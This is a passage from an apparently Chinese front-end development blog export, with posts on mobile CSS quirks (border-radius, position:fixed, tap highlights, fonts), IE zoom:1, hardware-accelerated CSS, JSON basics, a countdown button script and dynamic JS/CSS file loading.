    <url>%2F2015%2F09%2F06%2Fborder-radius-%E7%A7%BB%E5%8A%A8%E4%B9%8B%E4%BC%A4%2F</url>
    <content type="text"><![CDATA[border-radius我相信对于老一辈的前端们有着特殊的感情，在经历了没有圆角的蛮荒时代，到如今 CSS3 遍地开花，我们还是很幸福的。然而即使到了三星大脸流行时代，border-radius在移动端的表现依旧差强人意，主要有以下几点问题：一、Android 2.3 自带浏览器不支持 %通常我们实现一个正圆只需要border-radius: 50%即可，大致代码如下：123456.foo &#123; width: 100px; height: 100px; border-radius: 50%; border: 1px solid blue;&#125;然而 Android 2.3 是不支持百分比的，要兼容我们只能使用一个较大值，比如border-radius: 999px;二、Android 及 Safari 低版本 img 圆角问题当 img 元素有border 时设置border-radius 会导致圆角变形，需要在img 外面嵌套一个元素并设置border 和border-radius。查看演示图一：左侧是小米2S（Android 4.1），右侧是红米（Android 4.2）三、Android 4.2.x 背景色溢出及不支持 border-radius 缩写3.1 Android 4.2.x 背景色溢出测试发现，在 Android 4.2.x 系统自带浏览器中，同时设置border-radius和背景色的时候，背景色会溢出到圆角以外部分，需要是使用background-clip: padding-box;来修复，但是如果border-color为半透明时，背景直角部分依然会露出来（参见图一）。3.2 Android 4.2.x 不支持border-radius缩写这个 BUG在小米上测试并未发现，国外有人反映三星 Galaxy S4 中自带浏览器不支持。解决方案就是使用border-radius的四个扩写属性，缩写属性放到最后。以上两个问题影响到 Android 4.2.x 内核的系统以及在其基础上定制的系统的自带浏览器，比如：红米，小米3，阿里云OS 等，安卓版 Chrome 不受影响。完整代码应该是这样的：123456789101112.foo &#123; width: 100px; height: 100px; border: 5px solid blue; border-top-left-radius: 999px; /* 左上角 */ border-top-right-radius: 999px; /* 右上角 */ border-bottom-right-radius: 999px; /* 右下角 */ border-bottom-left-radius: 999px; /* 左下角 */ border-radius: 999px; background-color: #ccc; background-clip: padding-box;&#125;四、其他问题IE9 中fieldset元素不支持border-radius。IE9 中带有背景渐变(gradient)的时候背景溢出。全部 Demo 截图：]]></content>
      <categories>
        <category>移动前端</category>
      </categories>
      <tags>
        <tag>border-radius</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[移动端web页面使用position:fixed问题总结]]></title>
    <url>%2F2015%2F09%2F06%2F%E7%A7%BB%E5%8A%A8%E7%AB%AFweb%E9%A1%B5%E9%9D%A2%E4%BD%BF%E7%94%A8positionfixed%E9%97%AE%E9%A2%98%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;近期完成了一个新的项目，其中又涉及到了 fixed（固定位置定位）的问题，之前已经阐述过我对 iScroll 的态度，所以在这个项目中我决定不使用 iScroll，使用 position:fixed 实现头部、底部模块定位。在使用fixed的过程中，遇到了一些的问题，并且部分问题无法找到较好的解决方案。下面我就将这些问题一一阐述，提供给大家参考。正常界面图中被红色选中区域为 position:fixed 元素问题1：footer输入框 focus 状态，footer 被居中，而不是吸附在软键盘上部。测试环境：iPhone 4s&amp;5 / iOS 6&amp;7 / Safari问题2：页面底部，footer输入框失去焦点时，header定位出错。当页面有滚动动作时，header定位恢复正常。测试环境：iPhone 4s&amp;5 / iOS 6&amp;7 / Safari操作步骤：1、页面滚动到底部；2、选中底部输入框，使输入框进入focus状态；3、点击页面其他区域，使输入框失去焦点；问题3：当页面发生跳转，再退回时，fixed区域消失，当内容获得焦点时，fixed区域才显示。测试环境：iPhone 4 / iOS 5 / Safari（其他版本未发现此问题）问题4：部分浏览器不支持 fixed。测试环境：魅族MX2 / 自带浏览器（MX2上QQ、UC浏览器支持fixed，魅族的系统近期有过升级，更新之后自带浏览器就可以支持fixed）解决办法：使用 userAgent 检测，如果是魅族MX2自带浏览器则禁用 position:fixed，使用 position:relative 代替。PS: iOS4 也是不支持 fixed 的。问题5： 在滚屏过程中，fixed定位异常，touchend之后恢复正常。测试环境：三星i9100(S2) / 自带浏览器（QQ、UC浏览器正常）问题6： 部分低版本Android对支持不好，video poster属性设置的封面图会遮挡fixed元素。测试环境：摩托罗拉ME525+ / Android 2.3.4 / 自带浏览器、QQ、UC浏览器问题7： WP8下，QQ、UC浏览器滚动页面时footer定位错误，会往上偏移，是由于地址栏收起的缘故。测试环境：Nokia Lumia920 / WP8 / UC、QQ（自带浏览器正常）总结在 android 手机下 fixed 表现要比 iOS 更好，软键盘弹出时，不会影响fixed元素定位；不要在 fixed 元素中使用 input / textarea 元素。还是保留之前的态度，依然不推荐在 Android下使用 iScroll。在开发项目时，可以考虑分为两个版本：iOS下使用 iScroll的解决方案，Android下使用 position:fixed。]]></content>
      <categories>
        <category>移动前端</category>
      </categories>
      <tags>
        <tag>移动端fixed总结</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[用CSS开启硬件加速来提高网站性能]]></title>
    <url>%2F2015%2F09%2F06%2F%E7%94%A8css%E5%BC%80%E5%90%AF%E7%A1%AC%E4%BB%B6%E5%8A%A0%E9%80%9F%E6%9D%A5%E6%8F%90%E9%AB%98%E7%BD%91%E7%AB%99%E6%80%A7%E8%83%BD%2F</url>
    <content type="text"><![CDATA[翻译文章，原文地址：http://blog.teamtreehouse.com/increase-your-sites-performance-with-hardware-accelerated-css。&emsp;&emsp;你知道我们可以在浏览器中用css开启硬件加速，使GPU (Graphics Processing Unit) 发挥功能，从而提升性能吗？&emsp;&emsp;现在大多数电脑的显卡都支持硬件加速。鉴于此，我们可以发挥GPU的力量，从而使我们的网站或应用表现的更为流畅。在桌面端和移动端用CSS开启硬件加速&emsp;&emsp;CSS animations, transforms 以及 transitions 不会自动开启GPU加速，而是由浏览器的缓慢的软件渲染引擎来执行。那我们怎样才可以切换到GPU模式呢，很多浏览器提供了某些触发的CSS规则。&emsp;&emsp;现在，像Chrome, FireFox, Safari, IE9+和最新版本的Opera都支持硬件加速，当它们检测到页面中某个DOM元素应用了某些CSS规则时就会开启，最显著的特征的元素的3D变换。例如：12345.cube &#123; -webkit-transform: translate3d(250px,250px,250px) rotate3d(250px,250px,250px,-120deg) scale3d(0.5, 0.5, 0.5);&#125;&emsp;&emsp;可是在一些情况下，我们并不需要对元素应用3D变换的效果，那怎么办呢？这时候我们可以使用个小技巧“欺骗”浏览器来开启硬件加速。&emsp;&emsp;虽然我们可能不想对元素应用3D变换，可我们一样可以开启3D引擎。例如我们可以用transform: translateZ(0); 来开启硬件加速 。12345678.cube &#123;-webkit-transform: translateZ(0);-moz-transform: translateZ(0);-ms-transform: translateZ(0);-o-transform: translateZ(0);transform: translateZ(0);/* Other transform properties here */&#125;&emsp;&emsp;在 Chrome and Safari中，当我们使用CSS transforms 或者 animations时可能会有页面闪烁的效果，下面的代码可以修复此情况：123456789101112.cube &#123;-webkit-backface-visibility: hidden;-moz-backface-visibility: hidden;-ms-backface-visibility: hidden;backface-visibility: hidden;-webkit-perspective: 1000;-moz-perspective: 1000;-ms-perspective: 1000;perspective: 1000;/* Other transform properties here */&#125;&emsp;&emsp;在webkit内核的浏览器中，另一个行之有效的方法是1234567.cube &#123;-webkit-transform: translate3d(0, 0, 0);-moz-transform: translate3d(0, 0, 0);-ms-transform: translate3d(0, 0, 0);transform: translate3d(0, 0, 0);/* Other transform properties here */&#125;&emsp;&emsp;原生的移动端应用(Native mobile applications)总是可以很好的运用GPU，这是为什么它比网页应用(Web apps)表现更好的原因。硬件加速在移动端尤其有用，因为它可以有效的减少资源的利用(麦时注：移动端本身资源有限)。总结&emsp;&emsp;只对我们需要实现动画效果的元素应用以上方法，如果仅仅为了开启硬件加速而随便乱用，那是不明智的。&emsp;&emsp;小心使用这些方法，如果通过你的测试，结果确是提高了性能，你才可以使用这些方法。使用GPU可能会导致严重的性能问题，因为它增加了内存的使用，而且它会减少移动端设备的电池寿命。]]></content>
      <categories>
        <category>HTML5/CSS3</category>
      </categories>
      <tags>
        <tag>css开启硬件加速提高性能</tag>
        <tag>css通过硬件提高性能</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[无法自动播放的audio元素]]></title>
    <url>%2F2015%2F09%2F06%2F%E6%97%A0%E6%B3%95%E8%87%AA%E5%8A%A8%E6%92%AD%E6%94%BE%E7%9A%84audio%E5%85%83%E7%B4%A0%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;HTML5新增了video元素和audio元素，替代了传统HTML4使用复杂的object元素与embed来播放视频或者音频的方法。这次的一个项目，产品经理要求手机加载开始时播放音乐，想到播放音乐，又是在ios和android平台，那audio元素必然是首选。一、audio的基本知识audio:标签定义声音，比如音乐或其他音频流。二、audio的属性三、audio的写法写法一：1&lt;audio src="baishu.mp3" auto loop&gt;你的浏览器还不支持哦&lt;/audio&gt;写法二：12345&lt;audio controls="controls"&gt;&lt;source src="baishu.ogg" type="audio/ogg"&gt;&lt;source src="baishu.mp3" type="audio/mpeg"&gt;优先播放音乐baishu.ogg，不支持在播放baishu.mp3&lt;/audio&gt;四、audio实战&emsp;&emsp;在项目中使用audio，一开始在chrome浏览器下做测试，使用了autoplay和loop属性，在页面打开时自动播放并循环，在chrome是成功支持，发布到测试环境后，在ios和android手机中音乐不会自动播放- -!，做了一系列测试，使用JS，还是无法自动播放…&emsp;&emsp;想用回HTML4的object元素与embed，但手机中有些浏览器禁止了控件….&emsp;&emsp;后来在外国网站找了一些对audio使用的资料：对audio的使用，总结如下：1.audio元素的autoplay属性在ios和andriod上无法使用的，在PC端上正常2.audio元素没有设置controls时，在ios和android上会占据空间大小，而在PC端chrome是不会占据任何空间后来，跟产品经理商量后，暂不使用音乐了….如果大家有办法能在iso和android上自动播放背景音乐，请联系我~~~Thx&nbsp;参考资料：http://stackoverflow.com/questions/4259928/how-can-i-autoplay-media-in-ios-4-2-1-mobile-safarihttp://www.ibm.com/developerworks/library/wa-ioshtml5/index.htmlhttp://www.w3school.com.cn/html5/html5_audio.asp&nbsp;&nbsp;]]></content>
      <categories>
        <category>HTML5/CSS3</category>
      </categories>
      <tags>
        <tag>无法自动播放audio</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[如何去除android上a标签产生的边框]]></title>
    <url>%2F2015%2F09%2F06%2F%E5%A6%82%E4%BD%95%E5%8E%BB%E9%99%A4android%E4%B8%8Aa%E6%A0%87%E7%AD%BE%E4%BA%A7%E7%94%9F%E7%9A%84%E8%BE%B9%E6%A1%86%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;在ios4+和android2+系统，当手指触摸屏幕a标签链接或按钮时，会产生不同的效果，对于ios点击元素的时候，就会出现一个半透明的灰色背景；对于android则出现红色的边框。对这2个系统自带的效果，这种体验的意义无非为了告知用户按钮已经点击到，带来的价值是好的。可惜带来了体验的同时，也带来了bug……主要是在android手机的一个bug&emsp;&emsp;使用css给模块设置了opacity:0，控制该模块隐藏，如果该模块包含a标签，其a标签在android手机是可以被触发的，而在iphone是不可以触发。&emsp;&emsp;下图左图为模块一，当页面内容未加载完成时，显示该模块；右图为模块二，当页面内容完全加载成功后才显示该模块，模块二通过设置了完全透明使其隐藏在模块一的上一层级。&emsp;&emsp;在android手机中，当处于模块一状态时，用户触摸到“查看按钮”，a标签的边框显示出来，这明显不是我们要想要的体验。&emsp;&emsp;最后跟产品经理沟通后，针对android手机去除上图的按钮边框，那么如何去除android手机自带的按钮边框呢？在搜索引擎中找到资料-webkit-tap-highlight-color可以去除边框，如下图：排除误解&emsp;&emsp;网络资料说这个属性只用于iOS(iPhone和iPad)，其实是错误的，android手机大部分也是支持的，只是显示效果不一样，移动开发并不成熟，更多的还需要大家去实践来辨别真伪- --webkit-tap-highlight-color用法&emsp;&emsp;webkit内核的浏览器，当用户点击一个链接或者通过js定义的可点击元素的时候，会出现一个半透明的灰色背景或者红色的边框。&emsp;&emsp;如果想要禁用高亮，可设置颜色的alpha值为0，也就是属性值的最后一位设置为0就可以去除背景或者边框。去除android链接触摸时产生边框的css代码12a,button,input&#123;-webkit-tap-highlight-color:rgba(255,0,0,0);&#125;/* 1.去除android a/button/input标签被点击时产生的边框 2.去除ios a标签被点击时产生的半透明灰色背景 */]]></content>
      <categories>
        <category>移动前端</category>
      </categories>
      <tags>
        <tag>去除Android中a的边框</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[移动web页面使用微软雅黑字体的问题]]></title>
    <url>%2F2015%2F09%2F06%2F%E7%A7%BB%E5%8A%A8web%E9%A1%B5%E9%9D%A2%E4%BD%BF%E7%94%A8%E5%BE%AE%E8%BD%AF%E9%9B%85%E9%BB%91%E5%AD%97%E4%BD%93%E7%9A%84%E9%97%AE%E9%A2%98%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;很多前端工程师在开发手机页面的时候，发现视觉设计师们喜欢用微软雅黑作为中文字体进行设计，于是写页面的时候也定义 font-family 为微软雅黑，后来发到线上后，细心的产品经理发现页面的字体不是微软雅黑，要求马上修改，于是就惊呆了，还跟产品争执一番。实际上手机系统 ios、android 等是不支持微软雅黑字体，为了满足产品的需要，保证视觉稿的还原度，手机端是如何定义微软雅黑字体呢？&emsp;&emsp;相信大家会想到 @font-face 定义为微软雅黑字体并存放到 web 服务器上，在需要使用时被自动下载12345678@font-face &#123;font-family: 'MicrosoftYaHei';src: url('MicrosoftYaHei.eot'); /* IE9 Compat Modes */src: url('MicrosoftYaHei.eot?#iefix') format('embedded-opentype'), /* IE6-IE8 */url('MicrosoftYaHei.woff') format('woff'), /* Modern Browsers */url('MicrosoftYaHei.ttf') format('truetype'), /* Safari, Android, iOS */url('MicrosoftYaHei.svg#MicrosoftYaHei') format('svg'); /* Legacy iOS */&#125;&emsp;&emsp;雅黑字体问题虽然解决了，但也带来了影响，一来消耗用户的流量，二来对页面的打开速度造成了延迟。&emsp;&emsp;总感觉不好，为了说服产品经理，找了三大手机系统的字体资料：ios 系统默认中文字体是Heiti SC默认英文字体是Helvetica默认数字字体是HelveticaNeue无微软雅黑字体android 系统默认中文字体是Droidsansfallback默认英文和数字字体是Droid Sans无微软雅黑字体winphone 系统默认中文字体是Dengxian(方正等线体)默认英文和数字字体是Segoe无微软雅黑字体附：ios7字体列表&emsp;&emsp;并做了个小测试，下图为测试机 iphone 4s、三星 GT-N7000 android 2.3.6、HTC windows Phone 8.0 三种手机中的默认中文字体和英文字体展现：&emsp;&emsp;我们可以看出三种不同的中文字体和微软雅黑一样是无衬线字体，有无衬线只是一个小原因，而无论页面中使用哪种字体，肉眼很难看出它们的差异，对产品的体验几乎没有影响。&emsp;&emsp;有关衬线字体和无衬线字体的差别，参考下图：&emsp;&emsp;那么，使用系统默认的字体所达到的视觉效果跟使用微软雅黑字体没有明显的差别，权衡利弊，最终说服了产品经理放弃使用微软雅黑的想法。结论各个手机系统有自己的默认字体，且都不支持微软雅黑如无特殊需求，手机端无需定义中文字体，使用系统默认英文字体和数字字体可使用 Helvetica ，三种系统都支持代码：12/* 移动端定义字体的代码 */body&#123;font-family:Helvetica;&#125;&nbsp;]]></content>
      <categories>
        <category>移动前端</category>
      </categories>
      <tags>
        <tag>移动端 微软雅黑</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CSS中zoom:1的作用]]></title>
    <url>%2F2015%2F09%2F05%2Fcss%E4%B8%ADzoom1%E7%9A%84%E4%BD%9C%E7%94%A8%2F</url>
    <content type="text"><![CDATA[兼容IE6、IE7、IE8浏览器，经常会遇到一些问题，可以使用zoom:1来解决，有如下作用：触发IE浏览器的haslayout解决ie下的浮动，margin重叠等一些问题。比如，本站使用DIV做一行两列显示，HTML代码：1234567&lt;div class="h_mainbox"&gt;&lt;h2&gt;推荐文章&lt;/h2&gt;&lt;ul class="mainlist"&gt;&lt;li&gt;&lt;a href="#" style="color:#0000FF" target="_blank"&gt;CSS库吧&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="#" style="color:#0000FF" target="_blank"&gt;原创&lt; /a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/div&gt;CSS代码：123456.h_mainbox &#123; border:1px solid #dadada; padding:4px 15px; background:url(../mainbox_bg.gif) 0 1px repeat-x; margin-bottom:6px; overflow:hidden&#125;.h_mainbox h2 &#123; font-size:12px; height:30px; line-height:30px; border-bottom:1px solid #ccc; color:#555;&#125;.h_mainbox h2 span &#123; float:right; font-weight:normal;&#125;.h_mainbox ul &#123; padding:6px 0px; background:#fff;&#125;.mainlist &#123; overflow:auto; zoom:1;&#125;.h_mainbox li &#123; width:268px; float:left; height:24px; overflow:hidden; background:url(../icon3.gif) 0 6px no-repeat; padding:0px 5px 0px 18px; line-height:200%;&#125;加红色的那里就可以在IE6、IE7、IE8正常显示效果了。css中的zoom的作用1、检查页面的标签是否闭合不要小看这条，也许折腾了你两天都没有解决的 CSS BUG 问题，却仅仅源于这里。毕竟页面的模板一般都是由开发来嵌套的，而他们很容易犯此类问题。快捷提示：可以用 Dreamweaver 打开文件检查，一般没有闭合的标签，会黄色背景高亮。2、样式排除法有些复杂的页面也许加载了 N 个外链 CSS 文件，那么逐个删除 CSS 文件，找到 BUG 触发的具体 CSS 文件，缩小锁定的范围。对于刚才锁定的问题 CSS 样式文件，逐行删除具体的样式定义，定位到具体的触发样式定义，甚至是具体的触发样式属性。3、模块确认法有时候我们也可以从页面的 HTML 元素出发。删除页面中不同的 HTML 模块，寻找到触发问题的 HTML 模块。4、检查是否清除浮动其实有不少的 CSS BUG 问题是因为没有清除浮动造成的。养成良好的清除浮动的习惯是必要的，推荐使用 无额外 HTML 标签的清除浮动的方法（尽量避免使用 overflow:hidden;zoom:1 的类似方法来清除浮动，会有太多的限制性）。5、检查 IE 下是否触发 haslayout很多的 IE 下复杂 CSS BUG 都与 IE 特有的 haslayout 息息相关。熟悉和理解 haslayout 对于处理复杂的 CSS BUG 会事半功倍。推荐阅读 old9 翻译的 《On having layout》（如果无法翻越穿越伟大的 GFW，可阅读 蓝色上的转帖 ）快捷提示：如果触发了 haslayout，IE 的调试工具 IE Developer Toolbar 中的属性中将会显示 haslayout 值为 -1。6、边框背景调试法故名思议就是给元素设置显眼的边框或者背景（一般黑色或红色），进行调试。此方法是最常用的调试 CSS BUG 的方法之一，对于复杂 BUG 依旧适用。经济实惠还环保^^最后想强调一点的是，养成良好的书写习惯，减少额外标签，尽量语义，符合标准，其实可以为我们减少很多额外的复杂 CSS BUG，更多的时候其实是我们自己给自己制造了麻烦。希望你远离 BUG ，生活越来越美好。]]></content>
      <categories>
        <category>HTML5/CSS3</category>
      </categories>
      <tags>
        <tag>css中zoom作用</tag>
        <tag>zoom:1的作用</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[js实现点击按钮倒计时30秒发送手机验证码]]></title>
    <url>%2F2015%2F09%2F05%2Fjs%E5%AE%9E%E7%8E%B0%E7%82%B9%E5%87%BB%E6%8C%89%E9%92%AE%E5%80%92%E8%AE%A1%E6%97%B630%E7%A7%92%E5%8F%91%E9%80%81%E6%89%8B%E6%9C%BA%E9%AA%8C%E8%AF%81%E7%A0%81%2F</url>
    <content type="text"><![CDATA[js倒计时30秒 激活按钮点击功能，要求用户阅读完条款内容才能激活按钮，要求用户激活短信通道向用户手机发送验证码。html代码：12345678910111213&lt;div class="demo"&gt;&lt;p&gt;示例一：要求用户阅读完条款内容才能激活按钮&lt;/p&gt;&lt;form action="http://www.npm8.com/" method="post" name="agree"&gt;&lt;input type="submit" class="button" value="请认真查看&lt;服务条款和声明&gt; (30)" id="agree_btn" name="agreeb"&gt;&lt;/form&gt;&lt;br/&gt;&lt;br/&gt;&lt;br/&gt;&lt;p&gt;示例二：要求用户激活短信通道向用户手机发送验证码&lt;/p&gt;&lt;form action="http://www.npm8.com/" method="post" name="myform"&gt;&lt;input type="button" class="button" value="获取手机验证码" id="phone_btn" name="phone" onClick="showtime(30)"&gt;&lt;/form&gt;&lt;/div&gt;js代码：12345678910111213141516171819202122232425262728293031323334var secs = 30;document.agree.agreeb.disabled=true;for(var i=1;i&lt;=secs;i++) &#123; window.setTimeout("update(" + i + ")", i * 1000);&#125;function update(num) &#123; if(num == secs) &#123; document.agree.agreeb.value =" 我 同 意 "; document.agree.agreeb.disabled=false; &#125; else &#123; var printnr = secs-num; document.agree.agreeb.value = "请认真查看&lt;服务条款和声明&gt; (" + printnr +")"; &#125;&#125;function showtime(t)&#123; document.myform.phone.disabled=true; for(i=1;i&lt;=t;i++) &#123; window.setTimeout("update_p(" + i + ","+t+")", i * 1000); &#125;&#125;function update_p(num,t) &#123; if(num == t) &#123; document.myform.phone.value =" 重新发送 "; document.myform.phone.disabled=false; &#125; else &#123; printnr = t-num; document.myform.phone.value = " (" + printnr +")秒后重新发送"; &#125;&#125;查看演示点击下载&nbsp;]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>js 点击发送验证码</tag>
        <tag>js倒计时</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[html5全屏背景切换点击按钮svg背景滑动切换特效]]></title>
    <url>%2F2015%2F09%2F05%2Fhtml5%E5%85%A8%E5%B1%8F%E8%83%8C%E6%99%AF%E5%88%87%E6%8D%A2%E7%82%B9%E5%87%BB%E6%8C%89%E9%92%AEsvg%E8%83%8C%E6%99%AF%E6%BB%91%E5%8A%A8%E5%88%87%E6%8D%A2%E7%89%B9%E6%95%88%2F</url>
    <content type="text"><![CDATA[html5 svg背景切换，点击按钮滑动切换，全屏切换，适用浏览器：360、FireFox、Chrome、Safari、Opera、傲游、搜狗、世界之窗. 不支持IE8及以下浏览器。查看演示点击下载&nbsp;]]></content>
      <categories>
        <category>插件库</category>
      </categories>
      <tags>
        <tag>html5 svg</tag>
        <tag>svg背景切换</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[对json的详解]]></title>
    <url>%2F2015%2F09%2F02%2F%E5%AF%B9json%E7%9A%84%E8%AF%A6%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;很多刚入门的小伙伴对json格式甚是害怕，甚至陌生，今天这篇文章主要是针对新手来讲解一下json格式 。一、JSON概念&emsp;&emsp;JSON（JavaScript Object Natation）JS对象表示法，从属于JS（JavaScript），是一种基于文本、独立于语言的轻量级数据交换格式。它经常被拿来和XML作比较，比较方面一般有：可读性——不相上下，XML的标签形式规范，JSON语法简易可扩展性——二者的扩展性都很好，不过JSON可存储JS复合对象，XML就无缘了编码难度——XML更符合自然语言规范，JSON更倾向与机器语言。JSON比XML更小、更快、更易解析二、JSON结构JSON数据有两种结构:1.Name-Value对构成的集合，类似于HashMap1234&#123; "name":"Jenna", "age":"21" &#125;2.Value的有序列表，类似于Array1234[&#123;"name":"Jenna","age":"21"&#125;,&#123;"name":"lucy","age":"20"&#125;]三、JSON的使用&emsp;&emsp;对JSON的操作说到底就是操作一个Object对象，关于对Object的操作相信大家都不陌生，直接定义一个对象，赋值、取值、修改、删除等等一系列的基础性操作如下12345678910111213141516171819//获取一个名为dg表格，新更改的行集合row = $("#dg").datagrid('getChanges');if (row.length) &#123; var array=new Array; for (var i = 0; i &lt; row.length; i++) &#123; var obj = new Object(); obj.BidRecorderId = row[i].BidRecorderId; obj.CompanyName = row[i].CompanyName; //添加属性，还可以用下边的格式定义 obj["Quote"] = row[i].Quote; obj["QuoteScore"] = row[i].QuoteScore; //删除Quote属性 delete obj.Quote; //更新，直接赋值即可 obj.QuoteScore = "12" //都添加到array数组中 array.push(obj); &#125;&#125;四、JSON的序列化和反序列化&emsp;&emsp;在实际项目中js和controller之间传递的数据类型大部分是JSON格式的，另外引用第三方控件的时候，它们的很多操作返回值类型也是JSON格式。刚开始不知道JSON是什么，更不懂什么序列化反序列化，但是在做的过程中，需要序列化和反序列化的时候就上网查一下方法，很简单就实现了这个功能。在.net中Json解析的几种方法（一篇博客上看到的，很实用）&nbsp;序列化JSON12//序列化JSON类型的数据dataJson，并复制给arrayListarrayList: JSON.stringify(dataJson)反序列化JSON1234//反序列化arrayList数据var data = Request["arrayList"];JavaScriptSerializer jsData = new JavaScriptSerializer();List&lt;TestViewModel&gt; listTest = jsData.Deserialize&lt;List&lt;TestViewModel&gt;&gt;(data);小结：&emsp;&emsp;JSON的名字很高大上，没用之前以为又是什么新技术，用过之后才知道就是咱们平常接触的一些东西。所以往后还得多尝试，这样才能把知识结成网，更好的做到思想的融会贯通。]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>json</tag>
        <tag>json格式教程</tag>
        <tag>json讲解</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[动态加载、移除、替换js/css文件]]></title>
    <url>%2F2015%2F09%2F02%2F%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E3%80%81%E7%A7%BB%E9%99%A4%E3%80%81%E6%9B%BF%E6%8D%A2jscss%E6%96%87%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[1、动态加载一个js/css文件1234567891011121314function loadjscssfile(filename, filetype)&#123; if (filetype=="js")&#123; var fileref=document.createElement('script') fileref.setAttribute("type","text/javascript") fileref.setAttribute("src", filename) &#125;else if (filetype=="css")&#123; var fileref=document.createElement("link") fileref.setAttribute("rel", "stylesheet") fileref.setAttribute("type", "text/css") fileref.setAttribute("href", filename) &#125; if (typeof fileref!="undefined") document.getElementsByTagName("head")[0].appendChild(fileref)&#125;使用示例：123loadjscssfile("myscript.js", "js")loadjscssfile("javascript.php", "js")loadjscssfile("mystyle.css", "css")2、移动已经加载过的js/css123456789function removejscssfile(filename, filetype)&#123; var targetelement=(filetype=="js")? "script" : (filetype=="css")? "link" : "none" var targetattr=(filetype=="js")? "src" : (filetype=="css")? "href" : "none" var allsuspects=document.getElementsByTagName(targetelement) for (var i=allsuspects.length; i&gt;=0; i--)&#123; if (allsuspects[i] &amp;amp;&amp;amp; allsuspects[i].getAttribute(targetattr)!=null &amp;amp;&amp;amp; allsuspects[i].getAttribute(targetattr).indexOf(filename)!=-1) allsuspects[i].parentNode.removeChild(allsuspects[i]) &#125;&#125;使用示例："js")1removejscssfile(&quot;somestyle.css&quot;, &quot;css&quot;)3、替换已经加载的js/css文件，代码如下：12345678910111213141516171819202122232425function createjscssfile(filename, filetype)&#123; if (filetype=="js")&#123; var fileref=document.createElement('script') fileref.setAttribute("type","text/javascript") fileref.setAttribute("src", filename) &#125;else if (filetype=="css")&#123; var fileref=document.createElement("link") fileref.setAttribute("rel", "stylesheet") fileref.setAttribute("type", "text/css") fileref.setAttribute("href", filename) &#125; return fileref&#125; function replacejscssfile(oldfilename, newfilename, filetype)&#123; var targetelement=(filetype=="js")? "script" : (filetype=="css")? "link" : "none" var targetattr=(filetype=="js")? "src" : (filetype=="css")? "href" : "none" var allsuspects=document.getElementsByTagName(targetelement) for (var i=allsuspects.length; i&gt;=0; i--)&#123; if (allsuspects[i] &amp;&amp; allsuspects[i].getAttribute(targetattr)!=null &amp;&amp; allsuspects[i].getAttribute(targetattr).indexOf(oldfilename)!=-1)&#123; var newelement=createjscssfile(newfilename, filetype) allsuspects[i].parentNode.replaceChild(newelement, allsuspects[i]) &#125; &#125;&#125;使用示例：12replacejscssfile("oldscript.js", "newscript.js", "js")replacejscssfile("oldstyle.css", "newstyle", "css")&nbsp;]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>动态加载css/js文件</tag>
        <tag>动态替换css/js文件</tag>
        <tag>动态移除css/js文件</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[web前端开发中的浏览器CSS兼容性总结]]></title>
    <url>%2F2015%2F08%2F31%2Fweb%E5%89%8D%E7%AB%AF%E5%BC%80%E5%8F%91%E4%B8%AD%E7%9A%84%E6%B5%8F%E8%A7%88%E5%99%A8%E5%85%BC%E5%AE%B9%E6%80%A7%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[1、居中问题div里的内容，IE默认为居中，而FF默认为左对齐，可以尝试增加代码margin: 0 auto;2、高度问题两上下排列或嵌套的div，上面的div设置高度(height)，如果div里的实际内容大于所设高度，在FF中会出现两个div重叠的现象；但在IE中，下面的div会自动给上面的div让出空间所以为避免出现层的重叠，高度一定要控制恰当，或者干脆不写高度，让他自动调节，比较好的方法是 height:100%;但当这个div里面一级的元素都float了的时候，则需要在div块的最后，闭和前加一个沉底的空div，对应CSS是：1.float_bottom &#123;clear:both;height:0px;font-size:0px;padding:0;margin:0;border:0;line-height:0px;overflow:hidden;&#125;3、clear:both不想受到float浮动的，就在div中写入clear:both;4、IE浮动 margin产生的双倍距离123456#box&#123;float:left;width:100px;margin:0 0 0 100px; //这种情况之下IE会产生200px的距离display:inline; //使浮动忽略&#125;5、padding问题FF设置 padding 后，div会增加 height 和 width，但IE不会 （* 标准的 XHTML1.0 定义 dtd 好像一致了）高度控制恰当，或尝试使用 height:100%;宽度减少使用 padding但根据实际经验，一般FF和IE的 padding 不会有太大区别，div 的实际宽 = width + padding ，所以div写全 width 和 padding，width 用实际想要的宽减去 padding 定义。6、div嵌套时 y轴上 padding和 marign的问题FF里 y 轴上 子div 到 父div 的距离为 父padding + 子marignIE里 y 轴上 子div 到 父div 的距离为 父padding 和 子marign 里大的一个FF里 y 轴上 父padding=0 且 border=0 时，子div 到 父div 的距离为0，子marign 作用到 父div 外面7、padding，marign，height，width的傻瓜式解决技巧注意是技巧，不是方法：写好标准头12&lt;!DOCTYPE html PUBLIC “-//W3C//DTD XHTML 1.0 Transitional//EN” “http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd”&gt;&lt;html xmlns=”http://www.w3.org/1999/xhtml”&gt;高尽量用padding，慎用margin，height尽量补上100%，父级height有定值子级height不用100%，子级全为浮动时底部补个空clear:both的div宽尽量用margin，慎用padding，width算准实际要的减去padding8、列表类1. ul标签在FF中默认是有 padding值的，而在IE中只有margin有值先定义 ul {margin:0;padding:0;}2. ul和ol列表缩进问题消除ul、ol等列表的缩进时，样式应写成: 